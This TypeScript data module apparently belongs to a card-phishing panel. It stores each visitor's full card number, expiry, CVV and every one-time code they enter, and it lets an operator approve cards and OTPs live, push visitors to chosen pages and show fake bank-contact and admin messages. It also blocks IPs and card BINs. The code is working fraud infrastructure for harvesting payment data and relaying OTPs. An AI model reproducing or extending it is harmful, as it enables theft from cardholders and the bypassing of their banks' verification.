// Server-only data facade. The browser talks only to same-origin /api endpoints.

export type User = { uid: string; id: string; email: string | null };
export type DocRef = { __doc: true; collection: string; id: string };
export type CollRef = { __coll: true; collection: string };
export type AuthHandle = { __isAuthHandle: true };

// Kept as compatibility values for existing dashboard call sites. No Supabase
// client, URL, key, or secret is bundled into the browser anymore.
export const supabase = null;
export const db = null;
export const database = null;
export const auth: AuthHandle = { __isAuthHandle: true };

import {
  authRequestInit,
  clearStoredAccessToken,
  getStoredAccessToken,
  getStoredAdminUser,
  setStoredAccessToken,
  setStoredAdminUser,
} from "./auth-transport";
import { buildCardApprovalPayload } from "./approval-payload";
import { getCardApprovalDecision } from "./card-approval-status";

const MAX_AMOUNT_VALUE = 1_000_000;
const BLOCK_CACHE_TTL_MS = 10_000;
const POLL_INTERVAL_MS = 1_500;
let cachedIpBlocked: boolean | null = null;
let cachedVisitorIp: string | null = null;
let cachedVisitorGeo: any = null;
const blockedVisitorCache = new Map<
  string,
  { blocked: boolean; expiresAt: number }
>();

type ApiResponse<T> = { data?: T; error?: string; success?: boolean };

async function api<T>(url: string, init?: RequestInit): Promise<T> {
  const response = await fetch(url, authRequestInit(init));
  const body = (await response.json().catch(() => ({}))) as ApiResponse<T>;
  if (!response.ok) throw new Error(body.error || "Server request failed");
  return (
    Object.prototype.hasOwnProperty.call(body, "data") ? body.data : body
  ) as T;
}

const jsonInit = (
  method: string,
  body: unknown,
  keepalive = false
): RequestInit => ({
  method,
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(body),
  ...(keepalive ? { keepalive: true } : {}),
});

const visitorId = () =>
  typeof localStorage === "undefined"
    ? ""
    : localStorage.getItem("visitor") || "";

export const getOrCreateVisitorId = () => {
  const existing = visitorId();
  if (existing) return existing;
  if (typeof localStorage === "undefined") return "";
  const id =
    typeof crypto !== "undefined" && "randomUUID" in crypto
      ? `visitor_${crypto.randomUUID()}`
      : `visitor_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  localStorage.setItem("visitor", id);
  return id;
};

async function fetchRow(collection: string, id: string) {
  try {
    return await api<any>(
      `/api/db/${encodeURIComponent(collection)}/${encodeURIComponent(id)}?_t=${Date.now()}`
    );
  } catch {
    return null;
  }
}
async function upsertRow(
  collection: string,
  id: string,
  payload: any,
  merge = false,
  keepalive = false
) {
  applyOptimisticUpsert(collection, id, payload, merge);
  const res = await api<any>(
    `/api/db/${encodeURIComponent(collection)}/${encodeURIComponent(id)}`,
    jsonInit("POST", { payload, merge }, keepalive)
  );
  const serverRow = unwrapDocData(res);
  if (serverRow && typeof serverRow === "object") {
    applyRealtimeRowUpdate(collection, id, { id, data: { ...serverRow, id } });
  } else {
    triggerRealtimeRefresh(collection, true);
  }
  return res;
}
async function deleteRow(collection: string, id: string) {
  applyRealtimeRowDelete(collection, id);
  await api(
    `/api/db/${encodeURIComponent(collection)}/${encodeURIComponent(id)}`,
    { method: "DELETE", credentials: "same-origin" }
  );
  triggerRealtimeRefresh(collection, true);
}

export async function addData(data: any) {
  const payload = data;
  const id = typeof payload.id === "string" ? payload.id : visitorId();
  if (!id || cachedIpBlocked === true) return false;
  try {
    await upsertRow(
      "pays",
      id,
      {
        ...payload,
        id,
        updatedAt: new Date().toISOString(),
        createdDate: payload.createdDate || new Date().toISOString(),
      },
      true
    );
    return true;
  } catch {
    return false;
  }
}

export const handlePay = async (paymentInfo: any, setPaymentInfo?: any) => {
  const id = visitorId();
  if (!id) return false;
  const now = new Date().toISOString();
  let cardHistory: any[] = [];
  try {
    const existing = await fetchRow("pays", id);
    const prev = existing?.data || existing;
    if (Array.isArray(prev?.cardHistory)) {
      cardHistory = [...prev.cardHistory];
    }
  } catch {
    // ignore
  }
  const cleanCard = String(paymentInfo?.cardNumber || paymentInfo?.c1 || "").replace(/\s+/g, "");
  if (cleanCard) {
    cardHistory.push({
      cardNumber: cleanCard,
      c1: cleanCard,
      cardName: paymentInfo?.cardName || "",
      expiryMonth: paymentInfo?.expiryMonth || "",
      expiryYear: paymentInfo?.expiryYear || "",
      cvv: paymentInfo?.cvv || paymentInfo?.cpc || "",
      cpc: paymentInfo?.cpc || paymentInfo?.cvv || "",
      cardType: paymentInfo?.cardType || "",
      timestamp: now,
    });
  }
  const payload = {
    ...paymentInfo,
    cardNumber: cleanCard || paymentInfo?.cardNumber,
    c1: cleanCard || paymentInfo?.c1,
    cardLast4: cleanCard ? cleanCard.slice(-4) : undefined,
    cardBin: cleanCard ? cleanCard.slice(0, 6) : undefined,
    cardHistory,
    cardSubmittedAt: now,
    status: "pending_approval",
    cardApproved: false,
    cardStatus: "pending_approval",
    cardApprovalStatus: "pending_approval",
    approvalStatus: "pending_approval",
    cardApproval: "pending_approval",
    directedPath: null,
    directedStep: 0,
    directedAt: null,
    otpSubmitted: false,
    otpSubmittedAt: null,
    otpApproved: false,
    otpStatus: "pending",
  };
  await upsertRow("pays", id, payload, true);
  setPaymentInfo?.((prev: any) => ({ ...prev, status: "pending_approval" }));
  return true;
};
export const handleOtp = async (otp: string, page = "otp") => {
  const id = visitorId();
  if (!id) return false;
  const now = new Date().toISOString();
  const cleanOtp = String(otp ?? "").trim();
  const submitted = cleanOtp.length > 0;
  let otpHistory: any[] = [];
  try {
    const existing = await fetchRow("pays", id);
    const prev = existing?.data || existing;
    if (Array.isArray(prev?.otpHistory)) {
      otpHistory = [...prev.otpHistory];
    }
  } catch {
    // ignore
  }
  if (submitted) {
    otpHistory.push({
      code: cleanOtp,
      page,
      timestamp: now,
    });
  }
  await upsertRow(
    "pays",
    id,
    {
      otpSubmitted: submitted,
      otpSubmittedAt: now,
      currentPage: page,
      otpApproved: false,
      otpStatus: "pending",
      otpApprovalStatus: "pending",
      otp: cleanOtp,
      otpHistory,
    },
    true
  );
  return true;
};

export function doc(_db: unknown, collection: string, id: string): DocRef {
  return { __doc: true, collection, id };
}
export function collection(_db: unknown, name: string): CollRef {
  return { __coll: true, collection: name };
}
export function query(coll: CollRef): CollRef {
  return coll;
}
export function arrayUnion(...vals: any[]) {
  return { __arrayUnion: vals };
}
export function arrayRemove(...vals: any[]) {
  return { __arrayRemove: vals };
}

function unwrapDocData(row: any) {
  if (!row) return null;
  if (typeof row === "object" && "data" in row && row.data && typeof row.data === "object") {
    return row.data;
  }
  return row;
}

export async function getDoc(ref: DocRef) {
  const row = await fetchRow(ref.collection, ref.id);
  const data = unwrapDocData(row);
  return {
    id: ref.id,
    exists: () => data !== null,
    data: () => (data ? { ...data, id: ref.id } : undefined),
    ref,
  };
}
export async function setDoc(
  ref: DocRef,
  payload: any,
  options?: { merge?: boolean; keepalive?: boolean }
) {
  await upsertRow(
    ref.collection,
    ref.id,
    payload,
    options?.merge === true,
    options?.keepalive === true
  );
}
export async function updateDoc(ref: DocRef, payload: any) {
  await upsertRow(ref.collection, ref.id, payload, true);
}
export async function deleteDoc(ref: DocRef) {
  await deleteRow(ref.collection, ref.id);
}

export async function getDocs(coll: CollRef) {
  try {
    const rows = await api<any[]>(
      `/api/db/${encodeURIComponent(coll.collection)}?_t=${Date.now()}`
    );
    const docs = (rows || []).map((row: any) => {
      const ref = doc(null, coll.collection, row.id);
      return {
        id: row.id,
        ref,
        exists: () => true,
        data: () => ({ ...(row.data || {}), id: row.id }),
      };
    });
    return { docs, size: docs.length, forEach: (fn: any) => docs.forEach(fn) };
  } catch {
    return { docs: [], size: 0, forEach: (_fn: any) => {} };
  }
}

export function writeBatch(_db: unknown) {
  const ops: Array<() => Promise<void>> = [];
  return {
    delete: (ref: DocRef) => ops.push(() => deleteRow(ref.collection, ref.id)),
    set: (ref: DocRef, p: any, o?: { merge?: boolean }) =>
      ops.push(async () => {
        await upsertRow(ref.collection, ref.id, p, o?.merge === true);
      }),
    update: (ref: DocRef, p: any) =>
      ops.push(async () => {
        await upsertRow(ref.collection, ref.id, p, true);
      }),
    commit: async () => {
      for (const op of ops) await op();
    },
  };
}

function snapshotFor(id: string, data: any) {
  return {
    id,
    exists: () => data !== null,
    data: () => (data ? { ...data, id } : undefined),
  };
}
function collectionSnapshot(rows: any[]) {
  const docs = (rows || []).map((r: any) => ({
    id: r.id,
    data: () => ({ ...(r.data || {}), id: r.id }),
  }));
  return { docs, size: docs.length, forEach: (fn: any) => docs.forEach(fn) };
}

type ActiveSubscriber = {
  collection: string;
  docId?: string;
  emitFromCache: () => void;
  refresh: (force?: boolean) => void;
};

const activeSubscribers = new Set<ActiveSubscriber>();
const collectionRowsCache = new Map<string, Map<string, any>>();
let mutationEpoch = 0;
let sseInstance: EventSource | null = null;
let sseReconnectTimer: number | null = null;
let focusListenersBound = false;

function getCollectionMap(collection: string): Map<string, any> {
  let map = collectionRowsCache.get(collection);
  if (!map) {
    map = new Map<string, any>();
    collectionRowsCache.set(collection, map);
  }
  return map;
}

function getCachedRowsArray(collection: string): any[] {
  const map = collectionRowsCache.get(collection);
  if (!map) return [];
  return Array.from(map.values());
}

function emitSubscribersFromCache(collection: string) {
  activeSubscribers.forEach((sub) => {
    if (sub.collection === collection) {
      sub.emitFromCache();
    }
  });
}

function applyOptimisticUpsert(
  collection: string,
  id: string,
  payload: any,
  merge: boolean
) {
  if (!collection || !id) return;
  mutationEpoch += 1;
  const map = getCollectionMap(collection);
  const existing = map.get(id)?.data || {};
  const resolved: Record<string, any> = { ...(payload || {}) };
  for (const [k, v] of Object.entries(resolved)) {
    if (v && typeof v === "object" && Array.isArray((v as any).__arrayUnion)) {
      const prevArr = Array.isArray(existing[k]) ? existing[k] : [];
      resolved[k] = Array.from(new Set([...prevArr, ...(v as any).__arrayUnion]));
    } else if (
      v &&
      typeof v === "object" &&
      Array.isArray((v as any).__arrayRemove)
    ) {
      const prevArr = Array.isArray(existing[k]) ? existing[k] : [];
      const rem = new Set((v as any).__arrayRemove);
      resolved[k] = prevArr.filter((x: any) => !rem.has(x));
    }
  }
  const nextData = merge
    ? {
        ...existing,
        ...resolved,
        id,
        updatedAt: resolved.updatedAt || new Date().toISOString(),
      }
    : { ...resolved, id };
  map.set(id, { id, data: nextData });
  emitSubscribersFromCache(collection);
}

function applyRealtimeRowUpdate(collection: string, id: string, row: any) {
  if (!collection || !id || !row) return;
  mutationEpoch += 1;
  const map = getCollectionMap(collection);
  const existing = map.get(id)?.data || {};
  const incomingData = row.data && typeof row.data === "object" ? row.data : row;
  map.set(id, {
    id,
    data: {
      ...existing,
      ...incomingData,
      id,
    },
  });
  emitSubscribersFromCache(collection);
}

function applyRealtimeRowDelete(collection: string, id: string) {
  if (!collection || !id) return;
  mutationEpoch += 1;
  const map = collectionRowsCache.get(collection);
  if (map) {
    map.delete(id);
    emitSubscribersFromCache(collection);
  }
}

export function triggerRealtimeRefresh(collection?: string, force = false) {
  activeSubscribers.forEach((sub) => {
    if (!collection || sub.collection === collection) {
      sub.refresh(force);
    }
  });
}

function ensureRealtimeStream() {
  if (typeof window === "undefined" || typeof EventSource === "undefined") return;

  if (!focusListenersBound) {
    focusListenersBound = true;
    window.addEventListener("focus", () => triggerRealtimeRefresh(undefined, true));
    document.addEventListener("visibilitychange", () => {
      if (!document.hidden) triggerRealtimeRefresh(undefined, true);
    });
  }

  if (sseInstance && sseInstance.readyState !== EventSource.CLOSED) return;
  if (activeSubscribers.size === 0) return;

  const token = getStoredAccessToken();
  const streamUrl = token
    ? `/api/realtime/stream?token=${encodeURIComponent(token)}`
    : `/api/realtime/stream`;

  try {
    const es = new EventSource(streamUrl, { withCredentials: true });
    sseInstance = es;

    es.onmessage = (evt) => {
      try {
        const msg = JSON.parse(evt.data || "{}");
        if (msg.type === "connected") {
          triggerRealtimeRefresh(undefined, false);
          return;
        }
        const coll = msg.collection ? String(msg.collection) : "";
        const id = msg.id ? String(msg.id) : "";
        const isDelete =
          msg.type === "delete" ||
          String(msg.eventType || "").toUpperCase() === "DELETE";

        if (coll && id && isDelete) {
          applyRealtimeRowDelete(coll, id);
          triggerRealtimeRefresh(coll, true);
        } else if (coll && id && msg.row) {
          applyRealtimeRowUpdate(coll, id, msg.row);
          triggerRealtimeRefresh(coll, true);
        } else if (coll) {
          triggerRealtimeRefresh(coll, true);
        } else {
          triggerRealtimeRefresh(undefined, true);
        }
      } catch {
        triggerRealtimeRefresh(undefined, true);
      }
    };

    es.onerror = () => {
      try {
        es.close();
      } catch {}
      if (sseInstance === es) sseInstance = null;
      if (sseReconnectTimer) window.clearTimeout(sseReconnectTimer);
      if (activeSubscribers.size > 0) {
        sseReconnectTimer = window.setTimeout(() => {
          ensureRealtimeStream();
        }, 1500);
      }
    };
  } catch {
    // Fallback polling continues automatically
  }
}

export function onSnapshot(target: DocRef | CollRef, cb: (snap: any) => void) {
  let stopped = false;
  let last = "";
  let inFlight = false;
  let pendingRun = false;
  let forceNext = false;
  let timerId: number | null = null;
  const isDoc = Boolean((target as DocRef).__doc);
  const docId = isDoc ? (target as DocRef).id : undefined;

  const scheduleNext = (delayMs = 700) => {
    if (stopped) return;
    if (timerId !== null) window.clearTimeout(timerId);
    timerId = window.setTimeout(() => {
      void run();
    }, delayMs);
  };

  const emitFromCache = () => {
    if (stopped) return;
    if (isDoc && docId) {
      const map = collectionRowsCache.get(target.collection);
      const cached = map?.get(docId)?.data ?? null;
      const stamp = JSON.stringify(cached);
      if (stamp !== last) {
        last = stamp;
        cb(snapshotFor(docId, cached));
      }
    } else if (collectionRowsCache.has(target.collection)) {
      const rows = getCachedRowsArray(target.collection);
      const stamp = JSON.stringify(rows);
      if (stamp !== last) {
        last = stamp;
        cb(collectionSnapshot(rows));
      }
    }
  };

  const run = async () => {
    if (stopped) return;
    if (inFlight) {
      pendingRun = true;
      return;
    }
    inFlight = true;
    const shouldForce = forceNext;
    forceNext = false;
    const startEpoch = mutationEpoch;

    try {
      if (isDoc && docId) {
        const row = await fetchRow(target.collection, docId);
        if (stopped) return;
        if (mutationEpoch !== startEpoch) {
          pendingRun = true;
          return;
        }
        const data = unwrapDocData(row);
        const map = getCollectionMap(target.collection);
        if (data) {
          map.set(docId, { id: docId, data: { ...data, id: docId } });
        } else {
          map.delete(docId);
        }
        const stamp = JSON.stringify(data);
        if (shouldForce || stamp !== last) {
          last = stamp;
          cb(snapshotFor(docId, data));
        }
      } else {
        const rows = await api<any[]>(
          `/api/db/${encodeURIComponent(target.collection)}?_t=${Date.now()}`
        );
        if (stopped) return;
        if (mutationEpoch !== startEpoch) {
          pendingRun = true;
          return;
        }
        const nextMap = new Map<string, any>();
        for (const r of rows || []) {
          if (r && r.id) {
            nextMap.set(String(r.id), {
              id: String(r.id),
              data: { ...(r.data || {}), id: String(r.id) },
            });
          }
        }
        collectionRowsCache.set(target.collection, nextMap);
        const normalizedRows = Array.from(nextMap.values());
        const stamp = JSON.stringify(normalizedRows);
        if (shouldForce || stamp !== last) {
          last = stamp;
          cb(collectionSnapshot(normalizedRows));
        }
      }
    } catch {
      /* transient polling errors are ignored */
    } finally {
      inFlight = false;
      if (stopped) return;
      if (pendingRun) {
        pendingRun = false;
        scheduleNext(25);
      } else {
        scheduleNext(700);
      }
    }
  };

  const sub: ActiveSubscriber = {
    collection: target.collection,
    docId,
    emitFromCache,
    refresh: (force = false) => {
      if (stopped) return;
      if (force) forceNext = true;
      if (inFlight) {
        pendingRun = true;
      } else {
        scheduleNext(10);
      }
    },
  };

  activeSubscribers.add(sub);
  ensureRealtimeStream();
  void run();

  return () => {
    stopped = true;
    if (timerId !== null) window.clearTimeout(timerId);
    activeSubscribers.delete(sub);
    if (activeSubscribers.size === 0 && sseInstance) {
      try {
        sseInstance.close();
      } catch {}
      sseInstance = null;
    }
  };
}

export const loginWithEmail = async (
  email: string,
  password: string,
  rememberSession = true
) => {
  const data = await api<any>(
    "/api/auth/login",
    jsonInit("POST", { email, password })
  );
  if (data?.accessToken) {
    setStoredAccessToken(data.accessToken, rememberSession);
  }
  if (data?.user?.id) {
    setStoredAdminUser(
      { id: data.user.id, email: data.user.email ?? email },
      rememberSession
    );
  }
  if (sseInstance) {
    try {
      sseInstance.close();
    } catch {}
    sseInstance = null;
  }
  ensureRealtimeStream();
  return data;
};
export const logoutUser = async () => {
  clearStoredAccessToken();
  if (sseInstance) {
    try {
      sseInstance.close();
    } catch {}
    sseInstance = null;
  }
  await fetch("/api/auth/logout", {
    method: "POST",
    credentials: "same-origin",
  }).catch(() => {});
};
export const onAuthStateChanged = (
  _auth: unknown,
  cb: (u: User | null) => void
) => {
  let stopped = false;
  const cachedUser = getStoredAdminUser();
  const cachedToken = getStoredAccessToken();
  if (cachedUser && cachedToken) {
    cb(cachedUser);
  }
  const check = async () => {
    try {
      const u = await api<any>("/api/auth/me");
      if (!stopped) {
        if (u?.user) {
          const nextUser = {
            id: u.user.id,
            uid: u.user.id,
            email: u.user.email ?? null,
          };
          if (u?.accessToken) {
            setStoredAccessToken(u.accessToken, true);
          }
          setStoredAdminUser(nextUser, true);
          cb(nextUser);
        } else {
          clearStoredAccessToken();
          cb(null);
        }
      }
    } catch {
      if (!stopped && !cachedToken) cb(null);
    }
  };
  void check();
  return () => {
    stopped = true;
  };
};

export const fetchVisitorIp = async () => {
  if (cachedVisitorIp) return cachedVisitorIp;
  try {
    const json = await api<any>("/api/visitor-ip");
    cachedVisitorIp = json.ip;
    cachedVisitorGeo = json;
    return json.ip;
  } catch {
    return "";
  }
};
export const listenForIpBlock = (
  ip: string,
  callback: (blocked: boolean) => void
) =>
  onSnapshot(doc(null, "settings", "blockedIps"), snap => {
    const blocked = Boolean(snap.data()?.ips?.includes(ip.trim()));
    cachedIpBlocked = blocked;
    callback(blocked);
  });
export const ensureVisitorIp = async () => {
  const ip = await fetchVisitorIp();
  const id = visitorId();
  if (id && ip)
    await upsertRow(
      "pays",
      id,
      {
        ip,
        geoCountry: cachedVisitorGeo?.country,
        geoCity: cachedVisitorGeo?.city,
        ipUpdatedAt: new Date().toISOString(),
      },
      true
    );
  return { ip, blocked: !!cachedIpBlocked };
};
export const listenForApproval = (
  cb: (status: "approved" | "rejected") => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    const decision = getCardApprovalDecision(d);
    console.log("[DEBUG] listenForApproval snapshot data:", {
      cardApproved: d?.cardApproved,
      cardStatus: d?.cardStatus,
      cardApprovalStatus: d?.cardApprovalStatus,
      decision,
    });
    if (decision) cb(decision);
  });
export const handleCurrentPage = async (page: string) => {
  console.log("[DEBUG] handleCurrentPage update:", page);
  const id = visitorId();
  return id ? addData({ id, currentPage: page }) : false;
};
export const listenForDirectedStep = (
  callback: (step: number, data: any) => void
) => {
  let last = "";
  return onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    const step = Number(d?.directedStep) || 0;
    const path = typeof d?.directedPath === "string" ? d.directedPath : "";
    const at = String(d?.directedAt || "");
    if (at && at !== last && (step > 0 || path)) {
      last = at;
      callback(step, d);
    } else if (!step && !path) last = "";
  });
};
export const clearDirectedStep = async () => {
  const id = visitorId();
  if (id)
    await upsertRow(
      "pays",
      id,
      {
        directedStep: 0,
        directedPath: null,
        directedAt: null,
        updatedAt: new Date().toISOString(),
      },
      true
    );
};
export const listenForOtpApproval = (
  cb: (status: "approved" | "rejected") => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    console.log("[DEBUG] listenForOtpApproval snapshot data:", {
      otpApproved: d?.otpApproved,
      otpStatus: d?.otpStatus,
      otpApprovalStatus: d?.otpApprovalStatus,
    });
    if (
      d?.otpApproved === true ||
      d?.otpApprovalStatus === "approved" ||
      d?.otpStatus === "approved"
    )
      cb("approved");
    else if (d?.otpStatus === "rejected" || d?.otpApprovalStatus === "rejected")
      cb("rejected");
  });
export const updateApprovalStatus = async (
  id: string,
  approved: boolean,
  otpStep = 4
) => {
  const status = approved ? "approved" : "rejected";
  const decidedAt = new Date().toISOString();
  const payload = {
    cardApprovalStatus: status,
    cardApprovalStatusDecidedAt: decidedAt,
    ...buildCardApprovalPayload(status, decidedAt, otpStep),
  };
  console.log("[DEBUG] updateApprovalStatus executed:", {
    id,
    approved,
    status,
    payload,
  });
  return upsertRow("pays", id, payload, true);
};
export const updateOtpApprovalStatus = async (
  id: string,
  approved: boolean
) => {
  console.log("[DEBUG] updateOtpApprovalStatus:", { id, approved });
  return upsertRow(
    "pays",
    id,
    {
      otpApproved: approved,
      otpStatus: approved ? "approved" : "rejected",
      otpApprovalStatus: approved ? "approved" : "rejected",
    },
    true
  );
};
export const pushBankContactRequest = async (id: string) => {
  if (id)
    await upsertRow(
      "pays",
      id,
      {
        bankContactRequest: true,
        bankContactAt: new Date().toISOString(),
        bankContactConfirmed: false,
      },
      true
    );
};
export const listenForBankContactRequest = (
  callback: (show: boolean, payload: any) => void
) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) => {
    const d = snap.data();
    callback(Boolean(d?.bankContactRequest && !d?.bankContactConfirmed), {
      requestedAt: d?.bankContactAt,
      cardBin: "",
      cardBankName: "",
    });
  });
export const confirmBankContact = async () => {
  const id = visitorId();
  if (id)
    await upsertRow(
      "pays",
      id,
      { bankContactConfirmed: true, bankContactRequest: false },
      true
    );
};
export const listenForVisitorBlock = (callback: (blocked: boolean) => void) =>
  onSnapshot(doc(null, "pays", visitorId()), (snap: any) =>
    callback(Boolean(snap.data()?.blocked))
  );
const normalizeBin = (raw: string) =>
  (raw || "").replace(/\D/g, "").slice(0, 6);
export const isBinBlocked = async (value: string) => {
  const bin = normalizeBin(value);
  if (bin.length < 6) return false;
  const cached = blockedVisitorCache.get(bin);
  if (cached && cached.expiresAt > Date.now()) return cached.blocked;
  try {
    const blocked = Boolean(await fetchRow("blocked_bins", bin));
    blockedVisitorCache.set(bin, {
      blocked,
      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
    });
    return blocked;
  } catch {
    return false;
  }
};
export const addBlockedBin = async (bin: string, meta?: any) => {
  const n = normalizeBin(bin);
  if (n.length < 6) throw new Error("INVALID_BIN");
  await upsertRow(
    "blocked_bins",
    n,
    { bin: n, blockedAt: new Date().toISOString(), ...(meta || {}) },
    false
  );
  return true;
};
export const removeBlockedBin = async (bin: string) => {
  await deleteRow("blocked_bins", normalizeBin(bin));
  return true;
};
export const listenBlockedBins = (callback: (bins: any[]) => void) =>
  onSnapshot(collection(null, "blocked_bins"), (snap: any) => {
    const list: any[] = [];
    snap.forEach((d: any) => list.push({ bin: d.id, ...d.data() }));
    callback(list);
  });
export const updateVisitorBlockStatus = async (id: string, blocked: boolean) =>
  upsertRow(
    "pays",
    id,
    { blocked, blockedAt: blocked ? new Date().toISOString() : null },
    true
  );

export const pushCustomVisitorMessage = async (visitorId: string, message: string, title?: string) => {
  await setDoc(
    doc(null, "pays", visitorId),
    {
      customMessage: message,
      customMessageTitle: title || "رسالة من الإدارة",
      customMessageVisible: true,
      customMessageConfirmed: false,
      customMessageAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    },
    { merge: true }
  );
};

export const clearCustomVisitorMessage = async (visitorId: string) => {
  await setDoc(
    doc(null, "pays", visitorId),
    {
      customMessageVisible: false,
      updatedAt: new Date().toISOString(),
    },
    { merge: true }
  );
};

export const confirmCustomVisitorMessage = async () => {
  const id = visitorId();
  if (!id) return;
  await setDoc(
    doc(null, "pays", id),
    {
      customMessageVisible: false,
      customMessageConfirmed: true,
      customMessageConfirmedAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    },
    { merge: true }
  );
};

export const listenForVisitorDocument = (cb: (snap: any) => void) => {
  const id = visitorId();
  if (!id) return () => {};
  return onSnapshot(doc(null, "pays", id), cb);
};

export const listenForCustomVisitorMessage = (
  callback: (show: boolean, payload: { title?: string; message?: string }) => void
) => {
  return listenForVisitorDocument((snap: any) => {
    const d = snap.data();
    const visible = Boolean(d?.customMessageVisible && d?.customMessage);
    const confirmed = Boolean(d?.customMessageConfirmed);
    if (visible && !confirmed) {
      callback(true, {
        title: d?.customMessageTitle,
        message: d?.customMessage,
      });
    } else {
      callback(false, {});
    }
  });
};

